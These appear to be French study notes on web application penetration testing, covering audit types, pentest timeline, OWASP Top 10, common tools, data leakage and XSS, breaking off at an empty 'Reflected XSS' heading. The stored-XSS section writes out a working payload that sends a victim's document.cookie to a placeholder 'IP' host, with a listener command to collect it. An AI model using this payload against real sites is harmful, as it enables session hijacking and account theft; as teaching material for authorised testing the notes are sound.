# Pentest Web

QUOI ?

Apps webs de différentes natures : 

- Interface administration/configuration
- Interface web déployé pour les employés
- Interface web destinée pour les clients

QUAND ?

Demande faite par l'équipe produit :

- Nouvelle application web
- Nouvelle release
- Re-test

Lors d'audit interne, afin de gagner un "foothold" dans le system (active directory).
Domain Controler (Windows Server): cible en active directory, gère toutes les ressources, PC, groupes....

POURQUOI ?

Détecter des failles de sécurités pouvant être exploitées par:

- Un attaquant externe (blackbox)
- Un attaquant possédant un access legitime (greybox)
- Un employé malintentionné (greybox)

Ports connus :

80 : tcp
443 : https
8080 : http

## Penestration testing

- Black Box : Auditeur simule un attaquant externe, n'a aucune info sur le système
- Grey Box : Auditeur simule un attaquant en tant qu'utilisateur ou un compte administrateur (ayant un pied dans le système)
- White Box : L'équipe produit partarge le maximum d'information avec l'auditateur, compte admin, code source

## Timeline d'un pentest web

1)Kick-off :
    Definition du perimetre à tester
    Choix de l'environnement
    Definition du planning
    Definition des points de contact
    |
    |
    |
    [Optionnel] Demo
        Comprendre l'application et toutes les features
        Poser des questions à l'équipe produit

2)Test technique

3) Rédaction du rapport

4) Restitution

## Technique d'attaques

1) Identifier les fonctions à risque
    Intéraction avec la base de données (Input de connection)
    Intéraction avec le file system du serveur (Upload, download)
    Création d'objet (création d'un commentaire, XSS)

2) OWASP TOP 10

Requêtes d'authentification : POST/GET
POST /login.php
username = Hamza&password=pws123

GET /loging.php?username=Hamza&password=pwd123!@
Vulnerability, Logging and Monitoring Failures
= Si on a les logs, on a les credentials en clair

3) Toolings

OS : Kali Linux

**Burpsuite**
Proxy HTTP
Intercepter requete HTTP
Rejouer requete HTTP

**Web scanners**
Burpsuite
Nikto
Owasp ZAP

**Directory Bruteforce**
Dirbuster
Dirb
Dirsearch
Gobuster

## Login Panel (Black Box)

Message d'erreur -> User enumeration

## Technique Data Leakage

1) Fichier exposé par erreur
    FIchier de configuration
    Fichier random pouvant indiquer des noms d'utilisateurs

2) HTTP Header
    Peuvent reveler la version du software

3) Message d'erreur verbeux
    Peuvent donner la stack d'erreur
    Peuvent reveler la version du software

## Access Control Bypass

Cookie de session valide ? User bon privilège ?

Cookie de session previsible : JSESSIONID:0000000049

## Cross site scripting (XSS)

Executer du code javascript pa le navigateur web de la victime
    Recuperer le cookie de session de la victime
    Simuler une page de login afi de recuperer les identifiants de la victime
    Rediriger vers un site web tiers

Les fonctions à cibler: lorsque le champ entré par un utilisateur est affiché
Exemples:
    Chat
    Commentaires
    Creation d'un objet
    Message d'erreur

<script>alert('XSS')</script>
             |
             |
             f(x) wrapper
\<sript\>------------\<script\>

Stored XSS

Script éxécuter sans avertissement
<script>var i=new Image();i.src="http://IP/?cookie="+btoa(document.cookie);</script>

récupère le cookie d'un user, l'attaquant peut se connecter, si le cookie est alive

flage true : cookie peut être uniquement en http et pas en xss

Cross Origin Policy

IP ne fait pas partie de la liste pouvant communiquer : pas de requête

Avoir serveur, pour récup les donées :
python -m http.server 8000

## Reflected XSS







